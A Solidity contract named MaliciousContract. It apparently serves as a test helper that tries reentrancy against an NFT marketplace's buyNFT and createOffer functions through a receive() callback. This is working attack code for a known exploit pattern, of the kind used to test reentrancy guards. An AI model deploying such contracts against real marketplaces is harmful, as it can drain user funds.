// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IMarketplace {
    function buyNFT(bytes32 listingId) external payable;
    function createOffer(bytes32 listingId, uint96 amount) external payable;
}

contract MaliciousContract {
    IMarketplace public marketplace;
    bool private attacking;

    constructor(address _marketplace) {
        marketplace = IMarketplace(_marketplace);
    }

    // Reentrancy attack during buyNFT
    function attack(bytes32 listingId) external payable {
        attacking = true;
        marketplace.buyNFT{value: msg.value}(listingId);
        attacking = false;
    }

    // Reentrancy attack during offer creation
    function attackOffer(bytes32 listingId) external payable {
        attacking = true;
        marketplace.createOffer{value: msg.value}(listingId, uint96(msg.value));
        attacking = false;
    }

    // Attack to zero address
    function attackZeroAddress(bytes32 listingId) external payable {
        marketplace.buyNFT{value: msg.value}(listingId);
    }

    // Receive function for reentrancy
    receive() external payable {
        if (attacking) {
            // Attempt reentrancy
            marketplace.buyNFT{value: msg.value}(bytes32(0));
        }
    }
} 